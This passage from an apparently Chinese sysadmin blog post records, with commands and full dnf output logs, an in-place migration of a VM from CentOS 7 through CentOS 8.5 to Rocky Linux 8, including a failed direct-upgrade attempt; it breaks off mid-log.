<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils rpmconf</span><br><span class="line">rpmconf -a</span><br><span class="line">package-cleanup --leaves</span><br><span class="line">package-cleanup --orphans</span><br><span class="line">yum remove -y &lt;package&gt;</span><br></pre></td></tr></table></figure></div>
<!--
package-cleanup --leaves | grep el7 | xargs dnf remove -y
package-cleanup --orphans | grep el7 | xargs dnf remove -y
dnf remove openssl11-* libgfortran5-* vim-* python36-* -y
-->
<p>输出日志：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]# dnf install yum-utils</span><br><span class="line">Last metadata expiration check: 0:02:42 ago on Sun 15 Oct 2023 02:32:45 PM CST.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Package                                                           Arch                                            Version                                                       Repository                                            Size</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line">yum-utils                                                         noarch                                          1.1.31-54.el7_8                                               base-aliyun                                          122 k</span><br><span class="line">Installing dependencies:</span><br><span class="line">yum                                                               noarch                                          3.4.3-168.el7.centos                                          base-aliyun                                          1.2 M</span><br><span class="line">yum-metadata-parser                                               x86_64                                          1.1.4-10.el7                                                  base-aliyun                                           28 k</span><br><span class="line">yum-plugin-fastestmirror                                          noarch                                          1.1.31-54.el7_8                                               base-aliyun                                           34 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Install  4 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 1.4 M</span><br><span class="line">Installed size: 6.0 M</span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">Downloading Packages:</span><br><span class="line">(1/4): yum-plugin-fastestmirror-1.1.31-54.el7_8.noarch.rpm                                                                                                                                                   84 kB/s |  34 kB     00:00    </span><br><span class="line">(2/4): yum-metadata-parser-1.1.4-10.el7.x86_64.rpm                                                                                                                                                           54 kB/s |  28 kB     00:00    </span><br><span class="line">(3/4): yum-utils-1.1.31-54.el7_8.noarch.rpm                                                                                                                                                                 543 kB/s | 122 kB     00:00    </span><br><span class="line">(4/4): yum-3.4.3-168.el7.centos.noarch.rpm                                                                                                                                                                  899 kB/s | 1.2 MB     00:01    </span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Total                                                                                                                                                                                                       1.0 MB/s | 1.4 MB     00:01     </span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded.</span><br><span class="line">Running transaction</span><br><span class="line">  Preparing        :                                                                                                                                                                                                                    1/1</span><br><span class="line">  Installing       : yum-metadata-parser-1.1.4-10.el7.x86_64                                                                                                                                                                            1/4</span><br><span class="line">  Installing       : yum-plugin-fastestmirror-1.1.31-54.el7_8.noarch                                                                                                                                                                    2/4</span><br><span class="line">  Installing       : yum-3.4.3-168.el7.centos.noarch                                                                                                                                                                                    3/4</span><br><span class="line">  Installing       : yum-utils-1.1.31-54.el7_8.noarch                                                                                                                                                                                   4/4</span><br><span class="line">  Verifying        : yum-3.4.3-168.el7.centos.noarch                                                                                                                                                                                    1/4</span><br><span class="line">  Verifying        : yum-metadata-parser-1.1.4-10.el7.x86_64                                                                                                                                                                            2/4</span><br><span class="line">  Verifying        : yum-plugin-fastestmirror-1.1.31-54.el7_8.noarch                                                                                                                                                                    3/4</span><br><span class="line">  Verifying        : yum-utils-1.1.31-54.el7_8.noarch                                                                                                                                                                                   4/4</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  yum-utils-1.1.31-54.el7_8.noarch                     yum-3.4.3-168.el7.centos.noarch                     yum-metadata-parser-1.1.4-10.el7.x86_64                     yum-plugin-fastestmirror-1.1.31-54.el7_8.noarch                    </span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<h2 id="卸载-yum">卸载 yum</h2>
<p>确认没有包冲突之后，就可以卸载 yum 了，之后就完全使用 dnf 作为替代。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dnf remove -y yum*</span><br><span class="line">rm -Rf /etc/yum</span><br></pre></td></tr></table></figure></div>
<p>输出日志：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]# dnf remove -y yum*</span><br><span class="line">Dependencies resolved.</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Package                                                            Arch                                           Version                                                            Repository                                       Size</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Removing:</span><br><span class="line">yum                                                                noarch                                         3.4.3-168.el7.centos                                               @System                                         5.6 M</span><br><span class="line">yum-langpacks                                                      noarch                                         0.4.2-7.el7                                                        @System                                          71 k</span><br><span class="line">yum-metadata-parser                                                x86_64                                         1.1.4-10.el7                                                       @System                                          57 k</span><br><span class="line">yum-plugin-fastestmirror                                           noarch                                         1.1.31-54.el7_8                                                    @System                                          53 k</span><br><span class="line">yum-utils                                                          noarch                                         1.1.31-54.el7_8                                                    @System                                         337 k</span><br><span class="line">Removing dependent packages:</span><br><span class="line">firstboot                                                          x86_64                                         19.12-1.el7                                                        @System                                         294 k</span><br><span class="line">gnome-packagekit                                                   x86_64                                         3.28.0-1.el7                                                       @System                                           0  </span><br><span class="line">gnome-software                                                     x86_64                                         3.28.2-3.el7                                                       @System                                         8.4 M</span><br><span class="line">initial-setup-gui                                                  x86_64                                         0.3.9.45-1.el7.centos                                              @System                                          32 k</span><br><span class="line">Removing unused dependencies:</span><br><span class="line">PackageKit                                                         x86_64                                         1.1.10-2.el7.centos                                                @System                                         2.6 M</span><br><span class="line">PackageKit-yum                                                     x86_64                                         1.1.10-2.el7.centos                                                @System                                         301 k</span><br><span class="line">anaconda-core                                                      x86_64                                         21.48.22.159-1.el7.centos                                          @System                                         8.2 M</span><br><span class="line">anaconda-gui                                                       x86_64                                         21.48.22.159-1.el7.centos                                          @System                                         1.5 M</span><br><span class="line">anaconda-tui                                                       x86_64                                         21.48.22.159-1.el7.centos                                          @System                                         447 k</span><br><span class="line">createrepo                                                         noarch                                         0.9.9-28.el7                                                       @System                                         302 k</span><br><span class="line">gnome-packagekit-common                                            x86_64                                         3.28.0-1.el7                                                       @System                                         6.4 M</span><br><span class="line">gnome-packagekit-installer                                         x86_64                                         3.28.0-1.el7                                                       @System                                         202 k</span><br><span class="line">gnome-packagekit-updater                                           x86_64                                         3.28.0-1.el7                                                       @System                                         194 k</span><br><span class="line">initial-setup                                                      x86_64                                         0.3.9.45-1.el7.centos                                              @System                                         222 k</span><br><span class="line">python-meh                                                         noarch                                         0.25.3-1.el7                                                       @System                                         254 k</span><br><span class="line">python-meh-gui                                                     noarch                                         0.25.3-1.el7                                                       @System                                          24 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Remove  21 Packages</span><br><span class="line"></span><br><span class="line">Freed space: 35 M</span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded.</span><br><span class="line">Running transaction</span><br><span class="line">  Preparing        :                                                                                                                                                                                                                    1/1</span><br><span class="line">  Running scriptlet: initial-setup-gui-0.3.9.45-1.el7.centos.x86_64                                                                                                                                                                    1/21</span><br><span class="line">  Erasing          : initial-setup-gui-0.3.9.45-1.el7.centos.x86_64                                                                                                                                                                    1/21</span><br><span class="line">  Running scriptlet: initial-setup-gui-0.3.9.45-1.el7.centos.x86_64                                                                                                                                                                    1/21</span><br><span class="line">  Erasing          : anaconda-gui-21.48.22.159-1.el7.centos.x86_64                                                                                                                                                                     2/21</span><br><span class="line">  Erasing          : gnome-packagekit-3.28.0-1.el7.x86_64                                                                                                                                                                              3/21</span><br><span class="line">  Running scriptlet: gnome-packagekit-3.28.0-1.el7.x86_64                                                                                                                                                                              3/21</span><br><span class="line">  Erasing          : python-meh-gui-0.25.3-1.el7.noarch                                                                                                                                                                                4/21</span><br><span class="line">  Running scriptlet: initial-setup-0.3.9.45-1.el7.centos.x86_64                                                                                                                                                                        5/21</span><br><span class="line">  Erasing          : initial-setup-0.3.9.45-1.el7.centos.x86_64                                                                                                                                                                        5/21</span><br><span class="line">  Running scriptlet: initial-setup-0.3.9.45-1.el7.centos.x86_64                                                                                                                                                                        5/21</span><br><span class="line">  Erasing          : anaconda-tui-21.48.22.159-1.el7.centos.x86_64                                                                                                                                                                     6/21</span><br><span class="line">  Erasing          : anaconda-core-21.48.22.159-1.el7.centos.x86_64                                                                                                                                                                    7/21</span><br><span class="line">  Erasing          : createrepo-0.9.9-28.el7.noarch                                                                                                                                                                                    8/21</span><br><span class="line">  Erasing          : yum-utils-1.1.31-54.el7_8.noarch                                                                                                                                                                                  9/21</span><br><span class="line">  Erasing          : yum-langpacks-0.4.2-7.el7.noarch                                                                                                                                                                                 10/21</span><br><span class="line">warning: /etc/yum/pluginconf.d/langpacks.conf saved as /etc/yum/pluginconf.d/langpacks.conf.rpmsave</span><br><span class="line"></span><br><span class="line">  Running scriptlet: firstboot-19.12-1.el7.x86_64                                                                                                                                                                                     11/21</span><br><span class="line">  Erasing          : firstboot-19.12-1.el7.x86_64                                                                                                                                                                                     11/21</span><br><span class="line">  Running scriptlet: firstboot-19.12-1.el7.x86_64                                                                                                                                                                                     11/21</span><br><span class="line">  Erasing          : python-meh-0.25.3-1.el7.noarch                                                                                                                                                                                   12/21</span><br><span class="line">  Erasing          : gnome-packagekit-installer-3.28.0-1.el7.x86_64                                                                                                                                                                   13/21</span><br><span class="line">  Erasing          : gnome-packagekit-updater-3.28.0-1.el7.x86_64                                                                                                                                                                     14/21</span><br><span class="line">  Erasing          : gnome-packagekit-common-3.28.0-1.el7.x86_64                                                                                                                                                                      15/21</span><br><span class="line">  Erasing          : gnome-software-3.28.2-3.el7.x86_64                                                                                                                                                                               16/21</span><br><span class="line">  Running scriptlet: gnome-software-3.28.2-3.el7.x86_64                                                                                                                                                                               16/21</span><br><span class="line">  Erasing          : PackageKit-yum-1.1.10-2.el7.centos.x86_64                                                                                                                                                                        17/21</span><br><span class="line">  Erasing          : PackageKit-1.1.10-2.el7.centos.x86_64                                                                                                                                                                            18/21</span><br><span class="line">  Erasing          : yum-plugin-fastestmirror-1.1.31-54.el7_8.noarch                                                                                                                                                                  19/21</span><br><span class="line">  Erasing          : yum-3.4.3-168.el7.centos.noarch                                                                                                                                                                                  20/21</span><br><span class="line">  Erasing          : yum-metadata-parser-1.1.4-10.el7.x86_64                                                                                                                                                                          21/21</span><br><span class="line">  Verifying        : PackageKit-1.1.10-2.el7.centos.x86_64                                                                                                                                                                             1/21</span><br><span class="line">  Verifying        : PackageKit-yum-1.1.10-2.el7.centos.x86_64                                                                                                                                                                         2/21</span><br><span class="line">  Verifying        : anaconda-core-21.48.22.159-1.el7.centos.x86_64                                                                                                                                                                    3/21</span><br><span class="line">  Verifying        : anaconda-gui-21.48.22.159-1.el7.centos.x86_64                                                                                                                                                                     4/21</span><br><span class="line">  Verifying        : anaconda-tui-21.48.22.159-1.el7.centos.x86_64                                                                                                                                                                     5/21</span><br><span class="line">  Verifying        : createrepo-0.9.9-28.el7.noarch                                                                                                                                                                                    6/21</span><br><span class="line">  Verifying        : firstboot-19.12-1.el7.x86_64                                                                                                                                                                                      7/21</span><br><span class="line">  Verifying        : gnome-packagekit-3.28.0-1.el7.x86_64                                                                                                                                                                              8/21</span><br><span class="line">  Verifying        : gnome-packagekit-common-3.28.0-1.el7.x86_64                                                                                                                                                                       9/21</span><br><span class="line">  Verifying        : gnome-packagekit-installer-3.28.0-1.el7.x86_64                                                                                                                                                                   10/21</span><br><span class="line">  Verifying        : gnome-packagekit-updater-3.28.0-1.el7.x86_64                                                                                                                                                                     11/21</span><br><span class="line">  Verifying        : gnome-software-3.28.2-3.el7.x86_64                                                                                                                                                                               12/21</span><br><span class="line">  Verifying        : initial-setup-0.3.9.45-1.el7.centos.x86_64                                                                                                                                                                       13/21</span><br><span class="line">  Verifying        : initial-setup-gui-0.3.9.45-1.el7.centos.x86_64                                                                                                                                                                   14/21</span><br><span class="line">  Verifying        : python-meh-0.25.3-1.el7.noarch                                                                                                                                                                                   15/21</span><br><span class="line">  Verifying        : python-meh-gui-0.25.3-1.el7.noarch                                                                                                                                                                               16/21</span><br><span class="line">  Verifying        : yum-3.4.3-168.el7.centos.noarch                                                                                                                                                                                  17/21</span><br><span class="line">  Verifying        : yum-langpacks-0.4.2-7.el7.noarch                                                                                                                                                                                 18/21</span><br><span class="line">  Verifying        : yum-metadata-parser-1.1.4-10.el7.x86_64                                                                                                                                                                          19/21</span><br><span class="line">  Verifying        : yum-plugin-fastestmirror-1.1.31-54.el7_8.noarch                                                                                                                                                                  20/21</span><br><span class="line">  Verifying        : yum-utils-1.1.31-54.el7_8.noarch                                                                                                                                                                                 21/21</span><br><span class="line"></span><br><span class="line">Removed:</span><br><span class="line">  yum-3.4.3-168.el7.centos.noarch               yum-langpacks-0.4.2-7.el7.noarch                 yum-metadata-parser-1.1.4-10.el7.x86_64         yum-plugin-fastestmirror-1.1.31-54.el7_8.noarch   yum-utils-1.1.31-54.el7_8.noarch       </span><br><span class="line">  firstboot-19.12-1.el7.x86_64                  gnome-packagekit-3.28.0-1.el7.x86_64             gnome-software-3.28.2-3.el7.x86_64              initial-setup-gui-0.3.9.45-1.el7.centos.x86_64    PackageKit-1.1.10-2.el7.centos.x86_64  </span><br><span class="line">  PackageKit-yum-1.1.10-2.el7.centos.x86_64     anaconda-core-21.48.22.159-1.el7.centos.x86_64   anaconda-gui-21.48.22.159-1.el7.centos.x86_64   anaconda-tui-21.48.22.159-1.el7.centos.x86_64     createrepo-0.9.9-28.el7.noarch         </span><br><span class="line">  gnome-packagekit-common-3.28.0-1.el7.x86_64   gnome-packagekit-installer-3.28.0-1.el7.x86_64   gnome-packagekit-updater-3.28.0-1.el7.x86_64    initial-setup-0.3.9.45-1.el7.centos.x86_64        python-meh-0.25.3-1.el7.noarch         </span><br><span class="line">  python-meh-gui-0.25.3-1.el7.noarch           </span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">[root@shawnyan ~]# rm -Rf /etc/yum</span><br><span class="line">[root@shawnyan ~]#</span><br></pre></td></tr></table></figure></div>
<h2 id="切换-yum-源到-Rocky-Linux-8，并升级-–-FAILED">切换 yum 源到 Rocky Linux 8，并升级 – FAILED</h2>
<p>将现有的 yum 源文件进行备份，并上传 Rocky Linux 8 的仓库文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/yum.repos.d</span><br><span class="line">mkdir el7</span><br><span class="line">mv *.repo el7</span><br><span class="line">vi rocky.repo</span><br></pre></td></tr></table></figure></div>
<p>然后执行升级命令。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dnf upgrade</span><br></pre></td></tr></table></figure></div>
<p>不过这样从 CentOS 7 直接升级到 Rocky Linux 8 总是报错，尚未找到合适的解决办法。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Running transaction check</span><br><span class="line">Error: transaction check vs depsolve:</span><br><span class="line">(gcc &gt;= 8 with gcc &lt; 9) is needed by annobin-10.94-1.el8.x86_64</span><br><span class="line">rpmlib(RichDependencies) &lt;= 4.12.0-1 is needed by annobin-10.94-1.el8.x86_64</span><br><span class="line">(flatpak-selinux = 1.10.7-1.el8 if selinux-policy-targeted) is needed by flatpak-1.10.7-1.el8.x86_64</span><br><span class="line">rpmlib(RichDependencies) &lt;= 4.12.0-1 is needed by flatpak-1.10.7-1.el8.x86_64</span><br><span class="line">(annobin if gcc) is needed by redhat-rpm-config-131-1.el8.noarch</span><br><span class="line">(gcc-plugin-annobin if gcc) is needed by redhat-rpm-config-131-1.el8.noarch</span><br><span class="line">rpmlib(RichDependencies) &lt;= 4.12.0-1 is needed by redhat-rpm-config-131-1.el8.noarch</span><br><span class="line">(NetworkManager &gt;= 1.20 or dhclient) is needed by dracut-network-049-223.git20230119.el8.x86_64</span><br><span class="line">rpmlib(RichDependencies) &lt;= 4.12.0-1 is needed by dracut-network-049-223.git20230119.el8.x86_64</span><br><span class="line">(selinux-policy &gt;= 3.14.3-98 if selinux-policy) is needed by rng-tools-6.15-3.el8.x86_64</span><br><span class="line">rpmlib(RichDependencies) &lt;= 4.12.0-1 is needed by rng-tools-6.15-3.el8.x86_64</span><br><span class="line">(systemd-standalone-tmpfiles or systemd) is needed by samba-common-0:4.17.5-3.el8_8.noarch</span><br><span class="line">rpmlib(RichDependencies) &lt;= 4.12.0-1 is needed by samba-common-0:4.17.5-3.el8_8.noarch</span><br><span class="line">To diagnose the problem, try running: &#x27;rpm -Va --nofiles --nodigest&#x27;.</span><br><span class="line">You probably have corrupted RPMDB, running &#x27;rpm --rebuilddb&#x27; might fix the issue.</span><br><span class="line">The downloaded packages were saved in cache until the next successful transaction.</span><br><span class="line">You can remove cached packages by executing &#x27;dnf clean packages&#x27;.</span><br></pre></td></tr></table></figure></div>
<p>无奈只好采取迂回战略，先从 CentOS 7 升级到 CentOS 8，再迁移到 Rocky Linux。</p>
<h2 id="切换-yum-源到-CentOS-Vault-8-5-–-SUCCESS">切换 yum 源到 CentOS Vault 8.5 – SUCCESS</h2>
<p>将 yum 源切换到 CentOS Vault 8.5。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vi centos8.repo</span><br></pre></td></tr></table></figure></div>
<p>测试 yum 源是否可以正常使用。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dnf group list</span><br></pre></td></tr></table></figure></div>
<p>输出结果：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan yum.repos.d]# dnf group list</span><br><span class="line">AppStream-Aliyun                                                                                                                                                                                            8.6 MB/s |  11 MB     00:01    </span><br><span class="line">BaseOS-Aliyun                                                                                                                                                                                               7.0 MB/s | 7.1 MB     00:01    </span><br><span class="line">epel-aliyun                                                                                                                                                                                                 9.3 MB/s |  16 MB     00:01    </span><br><span class="line">Last metadata expiration check: 0:00:02 ago on Thu 05 Oct 2023 10:56:02 PM CST.</span><br></pre></td></tr></table></figure></div>
<p>关键步骤来了，从 CentOS 7 升级到 CentOS 8。</p>
<p>使用 <code>dnf distro-sync</code> 命令，将系统中已安装的软件包同步到最新版本。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">rpm --rebuilddb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">移除旧 CentOS kernel</span></span><br><span class="line">rpm -e `rpm -q kernel` --nodeps</span><br><span class="line">dnf -y --releasever=8 --allowerasing --setopt=deltarpm=false distro-sync --disablerepo=AppStream --best</span><br></pre></td></tr></table></figure></div>
<!--
rpm -ivh --nodeps --force https://mirrors.aliyun.com/centos-vault/8.5.2111/BaseOS/x86_64/os/Packages/dracut-network-049-191.git20210920.el8.x86_64.rpm

rpm -e --nodeps sysvinit-tools
-->
<img  alt="01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231018-7f6b05f1-9872-4765-8d26-9b821ab4afef.png"
                      referrerpolicy="no-referrer"
                >
<p>升级日志太多，此处省略一万字。。。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">  Cleanup          : setup-2.8.71-11.el7.noarch                                               1812/1816</span><br><span class="line">  Obsoleting       : centos-release-7-9.2009.1.el7.centos.x86_64                              1813/1816</span><br><span class="line">  Cleanup          : ncurses-base-5.9-14.20130511.el7_4.noarch                                1815/1816</span><br><span class="line">  Cleanup          : libgcc-4.8.5-44.el7.x86_64                                               1816/1816</span><br><span class="line">  Running scriptlet: libgcc-4.8.5-44.el7.x86_64                                               1816/1816</span><br><span class="line">  Running scriptlet: filesystem-3.8-6.el8.x86_64                                              1816/1816</span><br><span class="line">  Running scriptlet: glibc-all-langpacks-2.28-164.el8.x86_64                                  1816/1816</span><br><span class="line">  Running scriptlet: ca-certificates-2021.2.50-80.0.el8_4.noarch                              1816/1816</span><br><span class="line">  Running scriptlet: GeoIP-GeoLite-data-2018.06-5.el8.noarch                                  1816/1816</span><br><span class="line">  Running scriptlet: authselect-libs-1.2.2-3.el8.x86_64                                       1816/1816</span><br><span class="line">  Running scriptlet: kernel-core-4.18.0-348.7.1.el8_5.x86_64                                  1816/1816</span><br><span class="line">...</span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<p>升级完成后，查看系统版本，可以看到已经升级到了 CentOS 8.5，但是内核版本还停留在 el7，需要重启系统。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]# uname -r</span><br><span class="line">3.10.0-1160.95.1.el7.x86_64</span><br><span class="line">[root@shawnyan ~]# cat /etc/redhat-release</span><br><span class="line">CentOS Linux release 8.5.2111</span><br><span class="line">[root@shawnyan yum.repos.d]# hostnamectl</span><br><span class="line">   Static hostname: shawnyan</span><br><span class="line">         Icon name: computer-vm</span><br><span class="line">           Chassis: vm</span><br><span class="line">        Machine ID: e7f51860c9c34455bcb755eac18c8868</span><br><span class="line">           Boot ID: 9558aec7c722488da9388e251df4ebbf</span><br><span class="line">    Virtualization: vmware</span><br><span class="line">  Operating System: CentOS Linux 8</span><br><span class="line">       CPE OS Name: cpe:/o:centos:centos:8</span><br><span class="line">            Kernel: Linux 3.10.0-1160.95.1.el7.x86_64</span><br><span class="line">      Architecture: x86-64</span><br><span class="line">[root@shawnyan yum.repos.d]# reboot</span><br></pre></td></tr></table></figure></div>
<img  alt="02.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231025-d78458aa-45e8-4929-95b1-95b15b1ec4b6.png"
                      referrerpolicy="no-referrer"
                >
<p>重启之后，可以看到版本都升级到 el8 了。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Last login: Tue Oct 24 23:59:50 2023 from 192.168.8.1</span><br><span class="line">[root@shawnyan ~]# cat /etc/redhat-release</span><br><span class="line">CentOS Linux release 8.5.2111</span><br><span class="line">[root@shawnyan ~]# uname -a</span><br><span class="line">Linux shawnyan 4.18.0-348.7.1.el8_5.x86_64 #1 SMP Wed Dec 22 13:25:12 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[root@shawnyan ~]# hostnamectl</span><br><span class="line">   Static hostname: shawnyan</span><br><span class="line">         Icon name: computer-vm</span><br><span class="line">           Chassis: vm</span><br><span class="line">        Machine ID: e7f51860c9c34455bcb755eac18c8868</span><br><span class="line">           Boot ID: 56c5f6e4c9a0497db3654cf0d4b48541</span><br><span class="line">    Virtualization: vmware</span><br><span class="line">  Operating System: CentOS Linux 8</span><br><span class="line">       CPE OS Name: cpe:/o:centos:centos:8</span><br><span class="line">            Kernel: Linux 4.18.0-348.7.1.el8_5.x86_64</span><br><span class="line">      Architecture: x86-64</span><br><span class="line">[root@shawnyan ~]#</span><br></pre></td></tr></table></figure></div>
<h2 id="从-CentOS-8-切换到-Rocky-8">从 CentOS 8 切换到 Rocky 8</h2>
<p>从 CentOS 切换到 Rocky，需要先切换 yum 源，然后执行 <code>dnf swap</code> 切换命令即可。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dnf swap &#x27;centos-*&#x27; rocky-release</span><br></pre></td></tr></table></figure></div>
<p>输出日志：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan yum.repos.d]# dnf swap &#x27;centos-*&#x27; rocky-release</span><br><span class="line">epel-aliyun                                                                                                                                                                                                 1.3 MB/s |  16 MB     00:12    </span><br><span class="line">BaseOS-Aliyun                                                                                                                                                                                               1.9 MB/s | 7.2 MB     00:03    </span><br><span class="line">AppStream-Aliyun                                                                                                                                                                                            1.3 MB/s |  12 MB     00:08    </span><br><span class="line">Last metadata expiration check: 0:00:01 ago on Wed 25 Oct 2023 12:42:08 AM CST.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Package                                                         Architecture                                     Version                                                     Repository                                               Size</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line">rocky-release                                                   noarch                                           8.8-1.8.el8                                                 BaseOS-Aliyun                                            22 k</span><br><span class="line">Installing dependencies:</span><br><span class="line">rocky-gpg-keys                                                  noarch                                           8.8-1.8.el8                                                 BaseOS-Aliyun                                            13 k</span><br><span class="line">rocky-repos                                                     noarch                                           8.8-1.8.el8                                                 BaseOS-Aliyun                                            15 k</span><br><span class="line">Removing:</span><br><span class="line">centos-gpg-keys                                                 noarch                                           1:8-3.el8                                                   @base                                                   3.3 k</span><br><span class="line">centos-indexhtml                                                noarch                                           8.0-0.el8                                                   @base                                                   505 k</span><br><span class="line">centos-linux-release                                            noarch                                           8.5-1.2111.el8                                              @base                                                    26 k</span><br><span class="line">centos-linux-repos                                              noarch                                           8-3.el8                                                     @base                                                    26 k</span><br><span class="line">centos-logos                                                    x86_64                                           85.8-2.el8                                                  @base                                                   716 k</span><br><span class="line">centos-release-scl                                              noarch                                           2-3.el7.centos                                              @System                                                  20 k</span><br><span class="line">centos-release-scl-rh                                           noarch                                           2-3.el7.centos                                              @System                                                  20 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Install  3 Packages</span><br><span class="line">Remove   7 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 50 k</span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">Downloading Packages:</span><br><span class="line">(1/3): rocky-gpg-keys-8.8-1.8.el8.noarch.rpm                                                                                                                                                                 68 kB/s |  13 kB     00:00    </span><br><span class="line">(2/3): rocky-release-8.8-1.8.el8.noarch.rpm                                                                                                                                                                 107 kB/s |  22 kB     00:00    </span><br><span class="line">(3/3): rocky-repos-8.8-1.8.el8.noarch.rpm                                                                                                                                                                    62 kB/s |  15 kB     00:00    </span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Total                                                                                                                                                                                                       202 kB/s |  50 kB     00:00     </span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded.</span><br><span class="line">Running transaction</span><br><span class="line">  Preparing        :                                                                                                                                                                                                                    1/1</span><br><span class="line">  Running scriptlet: rocky-gpg-keys-8.8-1.8.el8.noarch                                                                                                                                                                                  1/1</span><br><span class="line">  Installing       : rocky-gpg-keys-8.8-1.8.el8.noarch                                                                                                                                                                                 1/10</span><br><span class="line">  Installing       : rocky-release-8.8-1.8.el8.noarch                                                                                                                                                                                  2/10</span><br><span class="line">  Installing       : rocky-repos-8.8-1.8.el8.noarch                                                                                                                                                                                    3/10</span><br><span class="line">  Erasing          : centos-release-scl-2-3.el7.centos.noarch                                                                                                                                                                          4/10</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-SCLo-scl.repo: remove failed: No such file or directory</span><br><span class="line"></span><br><span class="line">  Erasing          : centos-release-scl-rh-2-3.el7.centos.noarch                                                                                                                                                                       5/10</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-SCLo-scl-rh.repo: remove failed: No such file or directory</span><br><span class="line"></span><br><span class="line">  Erasing          : centos-linux-release-8.5-1.2111.el8.noarch                                                                                                                                                                        6/10</span><br><span class="line">  Erasing          : centos-linux-repos-8-3.el8.noarch                                                                                                                                                                                 7/10</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-Sources.repo: remove failed: No such file or directory</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-PowerTools.repo: remove failed: No such file or directory</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-Plus.repo: remove failed: No such file or directory</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-Media.repo: remove failed: No such file or directory</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-HighAvailability.repo: remove failed: No such file or directory</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-FastTrack.repo: remove failed: No such file or directory</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-Extras.repo: remove failed: No such file or directory</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-Devel.repo: remove failed: No such file or directory</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-Debuginfo.repo: remove failed: No such file or directory</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-ContinuousRelease.repo: remove failed: No such file or directory</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-BaseOS.repo: remove failed: No such file or directory</span><br><span class="line">warning: file /etc/yum.repos.d/CentOS-Linux-AppStream.repo: remove failed: No such file or directory</span><br><span class="line"></span><br><span class="line">  Erasing          : 